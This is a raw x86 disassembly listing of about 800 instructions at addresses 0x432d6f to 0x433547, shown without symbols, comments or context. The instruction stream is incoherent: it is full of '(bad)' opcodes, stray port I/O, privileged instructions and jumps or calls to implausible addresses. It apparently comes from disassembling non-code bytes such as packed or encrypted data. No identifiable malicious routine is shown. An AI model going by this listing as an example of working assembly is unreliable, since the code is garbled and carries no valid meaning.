  432d6f:	add    esp,edi
  432d71:	add    BYTE PTR [ebp-0x39],cl
  432d74:	mov    al,bl
  432d76:	test   DWORD PTR [ebx+0x1c348375],ecx
  432d7c:	sub    al,0xbf
  432d7e:	jmp    0x432d05
  432d80:	mov    edi,eax
  432d82:	lock jge 0x432d76
  432d85:	lea    esi,[edx-0x74bad5ff]
  432d8b:	mov    ebp,esp
  432d8d:	or     cl,dh
  432d8f:	leave  
  432d90:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432d97:	dec    ebp
  432d98:	dec    ebp
  432d99:	test   DWORD PTR [ebx],eax
  432d9b:	paddb  mm6,mm0
  432d9e:	add    DWORD PTR [eax],eax
  432da0:	dec    ebp
  432da1:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432da7:	mov    esi,DWORD PTR [edx]
  432da9:	or     al,0x2b
  432dab:	dec    ebp
  432dac:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432db2:	mov    esp,edi
  432db4:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432dbb:	mov    DWORD PTR [ebx],ebp
  432dbd:	call   0xc76b6ed
  432dc2:	mov    DWORD PTR [ebp+0x10],ecx
  432dc5:	(bad)  
  432dc6:	push   0x8b85ff10
  432dcb:	clc    
  432dcc:	or     al,0x54
  432dce:	(bad)  
  432dcf:	push   ecx
  432dd0:	retf   
  432dd1:	mov    ebx,0xff4d8dc8
  432dd6:	mov    DWORD PTR [ebp+0x8],eax
  432dd9:	xor    eax,DWORD PTR [ebp-0x75]
  432ddc:	cmp    ebp,DWORD PTR [ebx]
  432dde:	lsl    ebx,WORD PTR [edi-0x8]
  432de2:	call   DWORD PTR [ebx-0x741bff75]
  432de8:	(bad)  
  432de9:	or     al,0x5b
  432deb:	dec    ebp
  432dec:	or     BYTE PTR [ebx],dh
  432dee:	inc    ebp
  432def:	xor    esi,DWORD PTR ds:0x708088d
  432df5:	in     eax,0x9b
  432df7:	add    BYTE PTR [edx],dh
  432df9:	inc    ebp
  432dfa:	pop    edi
  432dfb:	xor    eax,edx
  432dfd:	test   DWORD PTR [eax],0x81108b8b
  432e03:	dec    ebp
  432e04:	sub    al,0x33
  432e06:	add    BYTE PTR [ebx],dh
  432e08:	push   esi
  432e09:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432e0f:	mov    edi,eax
  432e11:	or     BYTE PTR [ebp+0x45],al
  432e14:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432e1a:	xor    ecx,ecx
  432e1c:	pushf  
  432e1d:	push   es
  432e1e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432e25:	dec    ebp
  432e26:	inc    ebp
  432e27:	cmp    BYTE PTR [ecx],0x54
  432e2a:	pushf  
  432e2b:	gs (bad) 
  432e2d:	shl    esp,1
  432e2f:	dec    ebp
  432e30:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432e36:	shr    ecx,1
  432e38:	xlat   BYTE PTR ds:[ebx]
  432e39:	rol    bh,cl
  432e3b:	mov    edx,esp
  432e3d:	or     BYTE PTR [ebp+0x4588f84d],al
  432e43:	mov    ecx,DWORD PTR [eax]
  432e45:	or     BYTE PTR [eax],al
  432e47:	push   ebp
  432e48:	mov    edi,DWORD PTR [eax+0xfc728b]
  432e4e:	dec    ebp
  432e4f:	enter  0xceba,0x8
  432e53:	retf   0x1807
  432e56:	ret    0x9b4d
  432e59:	mov    esi,DWORD PTR [edx]
  432e5b:	or     al,0x33
  432e5d:	into   
  432e5e:	add    edx,esi
  432e60:	add    ecx,edx
  432e62:	bswap  eax
  432e64:	ror    esi,0x98
  432e67:	dec    ebp
  432e68:	add    cl,ch
  432e6a:	mov    edi,edi
  432e6c:	hlt    
  432e6d:	inc    esi
  432e6f:	inc    ebp
  432e70:	ret    0x4533
  432e73:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432e79:	or     BYTE PTR [ebx],dh
  432e7b:	dec    ebp
  432e7c:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432e82:	jne    0xff8d2e49
  432e88:	inc    ebp
  432e89:	inc    ebp
  432e8a:	mov    esi,DWORD PTR [ebx]
  432e8c:	clc    
  432e8d:	pop    esi
  432e8e:	ret    0xcaeb
  432e91:	mov    eax,esi
  432e93:	call   0x52048366
  432e98:	dec    ebp
  432e99:	add    eax,0xf8728b
  432e9e:	adc    eax,0xce0ccac9
  432ea3:	push   ebp
  432ea4:	ret    0xc6ec
  432ea7:	in     al,dx
  432ea8:	call   0x33437bb1
  432ead:	push   edi
  432eae:	add    edi,eax
  432eb0:	xor    eax,eax
  432eb2:	jmp    0x432ef9
  432eb4:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432eba:	add    eax,edi
  432ebc:	shr    eax,cl
  432ebe:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432ec4:	mov    esi,DWORD PTR [edx]
  432ec6:	in     al,dx
  432ec7:	pushf  
  432ec8:	ret    0x84c7
  432ecb:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432ed1:	inc    ebp
  432ed2:	in     al,dx
  432ed3:	xor    DWORD PTR [ebp-0x64],eax
  432ed6:	mov    eax,edi
  432ed8:	cld    
  432ed9:	fmul   st(2),st
  432edb:	sbb    dl,al
  432edd:	jmp    0x9c3b:0x304d45c1
  432ee4:	jbe    0x432ead
  432ee6:	mov    esp,eax
  432ee8:	clc    
  432ee9:	add    BYTE PTR [ebp+0x0],cl
  432eec:	mov    ecx,ecx
  432eee:	lea    eax,[ebp-0x5]
  432ef1:	mov    edi,edi
  432ef3:	call   0x51ce833d
  432ef8:	hlt    
  432ef9:	xor    eax,edx
  432efb:	mov    esi,0x9b7284
  432f00:	xor    cl,dl
  432f02:	mov    esi,eax
  432f04:	hlt    
  432f05:	into   
  432f06:	inc    ebp
  432f07:	scas   eax,DWORD PTR es:[edi]
  432f08:	mov    ebp,ecx
  432f0a:	cld    
  432f0b:	add    dl,cl
  432f0d:	add    dl,al
  432f0f:	inc    ebp
  432f10:	shr    DWORD PTR [ebx],0x4d
  432f13:	xor    edi,DWORD PTR [ebx]
  432f15:	mov    DWORD PTR [edi],ecx
  432f17:	clc    
  432f18:	dec    esi
  432f19:	inc    ebp
  432f1a:	dec    DWORD PTR [ebx-0x3d2b1775]
  432f20:	ret    0xc6ca
  432f23:	mov    BYTE PTR [ebp-0x32],0x53
  432f27:	scas   eax,DWORD PTR es:[edi]
  432f28:	inc    ebp
  432f29:	jmp    0x432f5b
  432f2b:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  432f32:	pop    ebx
  432f33:	xor    ecx,DWORD PTR [ebp+0x3]
  432f36:	mov    eax,DWORD PTR [ebx]
  432f38:	clc    
  432f39:	test   edx,ecx
  432f3b:	mov    ecx,esi
  432f3d:	cld    
  432f3e:	call   0x8ab77488
  432f43:	xor    ecx,DWORD PTR [eax+0x4533f303]
  432f49:	add    ecx,DWORD PTR [ebx-0x4974072d]
  432f4f:	fdiv   QWORD PTR [ebx]
  432f51:	retf   0xce89
  432f54:	in     al,0xc1
  432f56:	inc    ebp
  432f57:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  432f5d:	into   
  432f5e:	mov    dh,0xc1
  432f61:	call   0x8c1774ea
  432f66:	(bad)  
  432f67:	cld    
  432f68:	mov    ecx,DWORD PTR [ebp-0x14]
  432f6b:	xor    eax,ecx
  432f6d:	lea    eax,[ebp+0x8]
  432f70:	mov    esi,DWORD PTR [edx-0x4]
  432f73:	add    dl,al
  432f75:	inc    ebp
  432f76:	mov    esp,0x32d89b8b
  432f7b:	dec    ebp
  432f7c:	mov    esi,DWORD PTR [ebx]
  432f7e:	cld    
  432f7f:	xor    eax,edx
  432f81:	sub    esp,DWORD PTR [ebp-0x75]
  432f84:	int    0xec
  432f86:	sub    ecx,eax
  432f88:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  432f8e:	mov    esi,esp
  432f90:	call   0x34177d19
  432f95:	inc    DWORD PTR [ebx]
  432f97:	mov    edi,DWORD PTR [ebx]
  432f99:	cld    
  432f9a:	jne    0x432fe9
  432f9c:	mov    esi,DWORD PTR [ebx]
  432f9e:	aam    0x8d
  432fa0:	dec    ebp
  432fa1:	or     BYTE PTR [ebx],dh
  432fa3:	jb     0x432fa8
  432fa5:	add    BYTE PTR [edi+0x45],bl
  432fa8:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  432faf:	xor    ebp,esp
  432fb1:	xor    eax,edi
  432fb3:	sub    edi,esp
  432fb5:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  432fbb:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  432fc2:	inc    ebp
  432fc3:	xor    ecx,DWORD PTR [ecx+0x45891403]
  432fc9:	clc    
  432fca:	mov    eax,edi
  432fcc:	nop
  432fcd:	fadd   QWORD PTR [eax]
  432fcf:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  432fd5:	jmp    0x432f60
  432fd7:	mov    eax,DWORD PTR [ecx]
  432fd9:	fadd   DWORD PTR [eax]
  432fdb:	inc    ebp
  432fdc:	or     DWORD PTR [ebx],esi
  432fde:	dec    eax
  432fdf:	add    edx,DWORD PTR [ebx-0x2d]
  432fe2:	dec    ebp
  432fe3:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  432fe9:	inc    ebp
  432fea:	push   esp
  432feb:	mov    dl,BYTE PTR [ecx-0xd]
  432fee:	xor    ecx,DWORD PTR [ebp-0x45]
  432ff1:	(bad)  
  432ff3:	rol    BYTE PTR [eax],0xc1
  432ff6:	ret    
  432ff7:	inc    ebp
  432ff8:	inc    ebp
  432ff9:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  432fff:	xor    eax,ebx
  433001:	add    eax,DWORD PTR [ebp+0x23]
  433004:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43300a:	cmp    edi,0xc
  43300d:	dec    ebp
  43300e:	inc    ebp
  43300f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433015:	inc    ebp
  433016:	mov    esi,DWORD PTR [ebx]
  433018:	clc    
  433019:	lea    eax,[ebp+0x45725407]
  43301f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433023:	xor    edi,DWORD PTR [eax]
  433025:	mov    ecx,0xff8b8d4d
  43302a:	push   esp
  43302b:	enter  0x4df7,0x23
  43302f:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433035:	mov    eax,DWORD PTR [ebx]
  433037:	loopne 0x433024
  433039:	ret    0xc68b
  43303c:	push   esp
  43303d:	enter  0x9745,0x8b
  433041:	inc    ebp
  433042:	cld    
  433043:	mov    eax,edi
  433045:	clc    
  433046:	ret    
  433047:	ret    0xc645
  43304a:	mov    esi,DWORD PTR [ebx]
  43304c:	cld    
  43304d:	pop    esi
  43304e:	mov    ebx,0x83458bc3
  433054:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  433058:	dec    ebp
  433059:	xor    DWORD PTR [ebx],esi
  43305b:	pushf  
  43305c:	add    edi,DWORD PTR [edx-0x7767a77]
  433062:	fcom   DWORD PTR [ebp+0x45]
  433065:	mov    esi,DWORD PTR [ebx]
  433067:	adc    al,0x9c
  433069:	inc    ebp
  43306a:	(bad)  
  43306b:	mov    ebx,eax
  43306d:	adc    al,0x85
  43306f:	cmp    al,0x1
  433072:	inc    ebp
  433073:	add    BYTE PTR ds:0xe98b9c4d,bh
  433079:	mov    eax,DWORD PTR [ebx]
  43307b:	nop
  43307c:	add    BYTE PTR [eax],al
  43307e:	inc    ebp
  43307f:	mov    esi,DWORD PTR [ebx]
  433081:	add    eax,DWORD PTR [ebx]
  433083:	cmp    al,0x89
  433085:	mov    esp,esi
  433087:	clc    
  433088:	inc    ebp
  433089:	inc    ebp
  43308a:	add    edx,DWORD PTR [esi+0xc]
  43308d:	mov    edi,0x7ff0845
  433092:	in     al,dx
  433093:	(bad)  
  433094:	jne    0x433031
  433096:	mov    esi,DWORD PTR [edx]
  433098:	clc    
  433099:	add    ebp,DWORD PTR [esi]
  43309b:	mov    edi,edi
  43309d:	in     al,dx
  43309e:	mov    DWORD PTR [ebp-0x10],eax
  4330a1:	xor    eax,DWORD PTR [ebp+0x3]
  4330a4:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4330aa:	fmul   DWORD PTR [ebx-0x173caf39]
  4330b0:	lea    ecx,[ecx+0x45e8d4bc]
  4330b6:	clc    
  4330b7:	mov    edi,edi
  4330b9:	cmp    BYTE PTR [ebp+0x4d],al
  4330bc:	test   DWORD PTR [eax+0x74],ecx
  4330bf:	inc    ecx
  4330c0:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4330c6:	ret    
  4330c7:	inc    eax
  4330c8:	dec    DWORD PTR [ebx+0x4945f8f0]
  4330ce:	push   eax
  4330cf:	dec    eax
  4330d0:	test   al,0xd0
  4330d2:	dec    eax
  4330d4:	mov    eax,DWORD PTR [ebp-0x14]
  4330d7:	mov    eax,DWORD PTR [ebp+0x38]
  4330da:	mov    eax,ecx
  4330dc:	fadd   DWORD PTR [ebx]
  4330de:	dec    ebp
  4330df:	inc    eax
  4330e0:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4330e6:	inc    ebp
  4330e7:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  4330ed:	fadd   QWORD PTR [ebx]
  4330ef:	inc    ebp
  4330f0:	or     al,0x33
  4330f2:	dec    ebp
  4330f3:	add    edi,DWORD PTR [ebx]
  4330f5:	mov    DWORD PTR [edx-0x28],esi
  4330f8:	mov    eax,DWORD PTR [ebp-0x10]
  4330fb:	mov    eax,DWORD PTR [eax+0x10]
  4330fe:	mov    eax,edi
  433100:	lock ret 
  433102:	inc    ecx
  433103:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433109:	fsubr  st,st(5)
  43310b:	test   DWORD PTR [eax],eax
  43310d:	clc    
  43310e:	push   0x45
  433110:	(bad)  
  433111:	cmp    al,0xec
  433113:	pushf  
  433114:	inc    ebp
  433115:	(bad)  
  433116:	push   eax
  433117:	fsub   DWORD PTR [eax-0x7b]
  43311a:	(bad)  
  43311b:	clc    
  43311c:	mov    eax,0xf8008584
  433121:	mov    eax,DWORD PTR [ebp-0x4]
  433124:	mov    edi,0x4585c3cc
  43312a:	clc    
  43312b:	mov    eax,DWORD PTR [ebp+0x14]
  43312e:	xor    eax,DWORD PTR [ebp-0x64]
  433131:	mov    edi,eax
  433133:	in     al,dx
  433134:	les    esi,FWORD PTR [ebp-0x7b]
  433137:	mov    edi,eax
  433139:	or     al,0x4d
  43313b:	dec    ebp
  43313c:	mov    eax,ebp
  43313e:	in     al,0xf2
  433140:	dec    ebp
  433141:	dec    DWORD PTR [ecx+0x4dc7e045]
  433147:	fmul   DWORD PTR [ecx+0x4df8f085]
  43314d:	inc    ebp
  43314e:	mov    DWORD PTR [ebx],esi
  433150:	fadd   QWORD PTR [ebx]
  433152:	dec    ebp
  433153:	push   eax
  433154:	xor    eax,DWORD PTR [ebp+0x3]
  433157:	push   eax
  433158:	mov    DWORD PTR [eax+ebx*8],ebx
  43315b:	push   esi
  43315d:	mov    eax,DWORD PTR [eax]
  43315f:	lock cmp eax,0xf84e85c0
  433165:	inc    ebp
  433166:	test   BYTE PTR [ebx],dh
  433168:	add    DWORD PTR [ebx],eax
  43316a:	add    BYTE PTR [eax+0x4d],dl
  43316d:	jne    0x4331a2
  43316f:	lea    ecx,[ebx-0x7617fc44]
  433175:	div    ah
  433177:	inc    DWORD PTR [ebp+0x45]
  43317a:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433180:	jb     0x43310d
  433182:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433189:	mov    ecx,DWORD PTR [ebp-0x10]
  43318c:	xor    ecx,DWORD PTR [ebp+0x3]
  43318f:	mov    edi,DWORD PTR [ebx]
  433191:	adc    BYTE PTR [ebp+0x41],dh
  433194:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43319a:	ret    
  43319b:	push   ss
  43319c:	push   0x45
  43319e:	lea    ecx,[ebx+0x4de80cb0]
  4331a4:	sti    
  4331a5:	add    edi,edi
  4331a7:	or     BYTE PTR [ebp+0x4d],al
  4331aa:	mov    ebp,DWORD PTR [ebx]
  4331ac:	xor    ebp,ecx
  4331ae:	mov    al,BYTE PTR [edx]
  4331b0:	add    eax,0xc7200
  4331b5:	jne    0x433204
  4331b7:	lea    esi,[ebx]
  4331b9:	mov    al,0xf
  4331bb:	call   0xf2880
  4331c0:	shl    DWORD PTR [ecx],0x84
  4331c3:	pushf  
  4331c4:	add    DWORD PTR [ecx+0x4545d000],ecx
  4331ca:	mov    esi,DWORD PTR [edx]
  4331cc:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4331d3:	test   DWORD PTR [eax],eax
  4331d5:	clc    
  4331d6:	dec    ebp
  4331d7:	inc    ebp
  4331d8:	xor    edi,DWORD PTR [edi+ecx*1]
  4331db:	pushf  
  4331dc:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4331e3:	lea    eax,[ecx]
  4331e5:	int3   
  4331e6:	add    BYTE PTR [ebp+0x45],cl
  4331e9:	lea    ecx,[ebx-0x75b2cc38]
  4331ef:	lea    eax,ds:0x4d72c4
  4331f5:	mov    ecx,DWORD PTR [ebp-0x4]
  4331f8:	xor    ecx,edi
  4331fa:	bswap  ebx
  4331fc:	ror    BYTE PTR [ebp-0x35],0xe9
  433200:	rol    DWORD PTR [ecx],0x84
  433203:	add    BYTE PTR [ecx],al
  433205:	xor    eax,DWORD PTR [eax]
  433207:	pushf  
  433208:	inc    ebp
  433209:	jnp    0x8a43660c
  43320f:	mov    eax,DWORD PTR ds:0xcf72e8
  433215:	lock dec ebp
  433217:	retf   
  433218:	xor    ecx,DWORD PTR [ebp+0xf]
  43321b:	mov    eax,eax
  43321d:	fmul   st,st(3)
  43321f:	test   ecx,0x19b8484
  433225:	xor    al,BYTE PTR [eax]
  433227:	mov    DWORD PTR [ebp-0x28],eax
  43322a:	mov    eax,DWORD PTR [ebp+0x33]
  43322d:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433233:	ret    
  433234:	add    al,cl
  433236:	dec    ebp
  433237:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  43323d:	add    ecx,DWORD PTR ds:0xc7250
  433243:	inc    ebp
  433244:	rcl    DWORD PTR [eax+0x4d],0x2b
  433248:	mov    edi,edi
  43324a:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433250:	jb     0x433219
  433252:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  433259:	mov    esi,DWORD PTR [ebx]
  43325b:	cld    
  43325c:	mov    cl,bh
  43325e:	or     eax,0x372b6
  433263:	cmp    ecx,eax
  433265:	jne    0x4332e2
  43326b:	mov    eax,DWORD PTR [ebp-0x20]
  43326e:	mov    eax,DWORD PTR [eax]
  433270:	xor    eax,edi
  433272:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  433279:	mov    ecx,DWORD PTR [ebp-0x4]
  43327c:	mov    ecx,edi
  43327e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433284:	jb     0x433295
  433286:	add    BYTE PTR [edi-0x3f],dl
  433289:	add    BYTE PTR [ebp-0x75],cl
  43328c:	mov    esi,eax
  43328e:	xor    eax,DWORD PTR [eax]
  433290:	mov    al,bh
  433292:	or     eax,0x4b7284
  433297:	xor    al,cl
  433299:	mov    ecx,DWORD PTR [ebp-0x4]
  43329c:	mov    ecx,edi
  43329e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4332a4:	jb     0x4332b5
  4332a6:	add    BYTE PTR [edi],dh
  4332a8:	enter  0x8500,0x8b
  4332ac:	add    ah,bl
  4332ae:	add    BYTE PTR [eax],al
  4332b0:	inc    ebp
  4332b1:	(bad)  
  4332b2:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4332b9:	mov    esi,DWORD PTR [edx-0x4]
  4332bc:	add    bh,cl
  4332be:	dec    ebp
  4332bf:	mov    dh,0x8b
  4332c1:	add    esi,DWORD PTR [ebx]
  4332c3:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4332c9:	add    BYTE PTR [eax],al
  4332cb:	mov    eax,ecx
  4332cd:	loopne 0x43331c
  4332cf:	add    BYTE PTR [ebx-0x757bcc39],cl
  4332d5:	dec    ebx
  4332d6:	or     eax,0x8b7232
  4332db:	in     al,0xc1
  4332dd:	or     DWORD PTR [ebp-0x31],ecx
  4332e0:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4332e7:	xor    dh,BYTE PTR [edx-0x75]
  4332ea:	add    al,dh
  4332ec:	enter  0x4f09,0xcf
  4332f0:	inc    ebp
  4332f1:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4332f7:	or     al,BYTE PTR ds:0xe4728b
  4332fd:	or     DWORD PTR [ebp-0x31],ecx
  433300:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433307:	cmp    dh,BYTE PTR [edx+0xf]
  43330a:	add    bl,dl
  43330c:	rol    DWORD PTR [eax],0x4d
  43330f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433315:	(bad)  
  433316:	or     eax,0x4b7284
  43331b:	xor    al,cl
  43331d:	mov    ecx,DWORD PTR [ebp-0x20]
  433320:	mov    ecx,DWORD PTR [ecx]
  433322:	xor    ecx,edi
  433324:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43332b:	xor    cl,al
  43332d:	mov    ecx,DWORD PTR [edi]
  43332f:	fadd   QWORD PTR [ebp+0x9]
  433332:	call   0xffd02e06
  433337:	dec    ebx
  433338:	dec    ebp
  433339:	xor    bh,BYTE PTR [ebx]
  43333b:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  43333f:	loopne 0x43333d
  433341:	or     edi,eax
  433343:	iret   
  433344:	ret    
  433345:	mov    WORD PTR [ebp+0x4f],es
  433348:	mov    esi,DWORD PTR [edx]
  43334a:	call   0x8452fa89
  43334f:	(bad)  
  433350:	fwait
  433351:	add    BYTE PTR [edx],dh
  433353:	mov    esi,DWORD PTR [ebx]
  433355:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43335b:	test   BYTE PTR [ebx],dh
  43335d:	dec    ebx
  43335e:	add    esi,DWORD PTR [edx]
  433360:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  433366:	dec    edi
  433368:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  43336f:	xor    al,BYTE PTR [ebx]
  433371:	mov    edi,DWORD PTR [ebx]
  433373:	in     al,0x75
  433375:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43337b:	dec    ebx
  43337c:	xor    esi,DWORD PTR [edx]
  43337e:	lea    ecx,[edx]
  433380:	or     BYTE PTR [ebx+0x900f072],cl
  433386:	ja     0x433357
  433388:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43338f:	cmp    ch,al
  433391:	jne    0x433386
  433393:	mov    edi,edi
  433395:	fadd   QWORD PTR [ebp+0x0]
  433398:	mov    eax,edi
  43339a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4333a1:	mov    edx,DWORD PTR [ebx]
  4333a3:	in     al,0x45
  4333a5:	or     DWORD PTR [ebx],esi
  4333a7:	iret   
  4333a8:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4333af:	xor    dl,BYTE PTR [eax-0x75]
  4333b2:	sbb    al,0xe0
  4333b4:	dec    DWORD PTR [ecx]
  4333b6:	mov    ecx,edi
  4333b8:	in     al,dx
  4333b9:	mov    eax,es
  4333bb:	dec    ebx
  4333bc:	mov    DWORD PTR [edx],esi
  4333be:	fmul   QWORD PTR [edx]
  4333c0:	jne    0x43334d
  4333c2:	(bad)  
  4333c3:	(bad)  
  4333c5:	or     DWORD PTR [ebp-0x31],eax
  4333c8:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4333cf:	cmp    bh,bh
  4333d1:	jne    0x433418
  4333d3:	lea    ecx,[ebx-0x38372750]
  4333d9:	inc    ebx
  4333db:	mov    eax,ecx
  4333dd:	mov    eax,0xa00c111
  4333e2:	jne    0x433429
  4333e4:	mov    esi,DWORD PTR [ebx]
  4333e6:	test   al,0x3
  4333e8:	inc    ebp
  4333e9:	mov    DWORD PTR [eax-0xc],edx
  4333ec:	loop   0x433433
  4333ee:	push   DWORD PTR [ebx]
  4333f0:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  4333f6:	add    DWORD PTR [eax],eax
  4333f8:	mov    eax,edi
  4333fa:	lods   al,BYTE PTR ds:[esi]
  4333fb:	dec    ebp
  4333fc:	inc    ebp
  4333fd:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433403:	retf   
  433404:	mov    edx,ecx
  433406:	adc    al,0x84
  433408:	(bad)  
  433409:	std    
  43340a:	ret    
  43340b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433411:	hlt    
  433412:	rol    edi,0x82
  433415:	ret    
  433416:	cld    
  433417:	enter  0x11ff,0x45
  43341b:	inc    ebp
  43341c:	pop    edi
  43341d:	mov    ebx,DWORD PTR [ebx+0x14]
  433420:	ret    0xc7
  433423:	test   BYTE PTR [ebx+0x4532519b],cl
  433429:	jmp    0x4333b6
  43342b:	push   0x8
  43342d:	call   DWORD PTR [esi]
  43342f:	in     al,dx
  433430:	add    BYTE PTR [ebp+0x1],0x50
  433434:	add    bh,ah
  433436:	add    bh,bh
  433438:	icebp  
  433439:	mov    ecx,DWORD PTR [eax]
  43343b:	cld    
  43343c:	pop    es
  43343d:	dec    ebp
  43343e:	shl    DWORD PTR [ebx],0x72
  433441:	add    eax,DWORD PTR [eax]
  433443:	cmp    edx,ecx
  433445:	je     0x433457
  433447:	mov    esi,DWORD PTR [ebp-0x4]
  43344a:	inc    edi
  43344c:	or     al,0xc3
  43344e:	jmp    FWORD PTR [edx-0x18]
  433451:	(bad)  
  433452:	sti    
  433453:	cwde   
  433454:	(bad)  
  433455:	call   0xffa12d60
  43345a:	or     al,0x45
  43345c:	push   ebp
  43345d:	sub    esp,0x18
  433460:	push   ebx
  433461:	inc    ebp
  433462:	mov    edi,edi
  433464:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43346b:	test   al,0x54
  43346d:	inc    ebp
  43346e:	push   ecx
  43346f:	push   eax
  433470:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  433476:	add    ah,bh
  433478:	(bad)  
  433479:	dec    ebp
  43347a:	add    DWORD PTR [ebx],esi
  43347c:	inc    ebp
  43347d:	add    ecx,DWORD PTR [ebx+0x74943b]
  433483:	push   0xffffff8b
  433485:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43348b:	add    eax,DWORD PTR [ecx]
  43348d:	or     BYTE PTR [eax],al
  43348f:	call   0xff852c94
  433494:	mov    eax,DWORD PTR [ebp+0x14]
  433497:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43349d:	inc    ebp
  43349e:	dec    ecx
  43349f:	add    ebp,DWORD PTR [edx+0x14]
  4334a2:	push   0x8b3045
  4334a7:	call   0x33ad821c
  4334ac:	inc    DWORD PTR [ebx]
  4334ae:	mov    DWORD PTR [edi],ecx
  4334b0:	mov    eax,ecx
  4334b2:	or     BYTE PTR [ebp-0x3d],cl
  4334b5:	cmp    eax,edi
  4334b7:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4334bc:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4334c2:	adc    al,0xc9
  4334c4:	inc    ebp
  4334c5:	adc    BYTE PTR [eax+0x55],dl
  4334c8:	jne    0x4334b6
  4334ca:	call   0xff54345a
  4334cf:	dec    ebp
  4334d0:	inc    ebp
  4334d1:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4334d7:	add    BYTE PTR [ebx],bh
  4334d9:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4334dd:	push   esp
  4334de:	or     al,0x51
  4334e0:	dec    ebp
  4334e1:	xor    DWORD PTR [ebx],0xf32039b
  4334e7:	cmp    eax,DWORD PTR [ebp+0x74]
  4334ea:	mov    edi,edi
  4334ec:	pop    edi
  4334ed:	adc    BYTE PTR [ebx+0x75],bl
  4334f0:	ret    0x50
  4334f3:	mov    edx,DWORD PTR ss:[edi-0x7d]
  4334f7:	(bad)  
  4334f8:	clc    
  4334f9:	mov    esp,ebp
  4334fb:	pop    ecx
  4334fc:	mov    ecx,0xf80085c2
  433501:	mov    ecx,DWORD PTR [ecx+edx*2]
  433504:	push   esi
  433505:	push   esi
  433506:	(bad)  
  433507:	lock add DWORD PTR [ebp+0x44],eax
  43350b:	mov    edx,DWORD PTR [eax]
  43350d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433511:	or     BYTE PTR [edi+eax*1+0x51],dl
  433515:	ret    
  433516:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43351c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433522:	or     al,0x80
  433524:	jge    0x433527
  433526:	mov    DWORD PTR [eax],eax
  433528:	and    al,0x8
  43352a:	cmp    DWORD PTR [ebp+0x10],eax
  43352d:	mov    edx,DWORD PTR [esi]
  43352f:	xchg   esp,eax
  433530:	dec    esp
  433531:	add    BYTE PTR [eax],dl
  433533:	mov    ecx,edx
  433535:	add    edx,DWORD PTR [esp+edi*1+0x8]
  433539:	dec    ebp
  43353a:	into   
  43353b:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433541:	mov    edx,DWORD PTR [eax+0x14]
  433544:	das    
  433545:	add    al,0x45
  433547:	add    BYTE PTR [ebp+0x0],dh
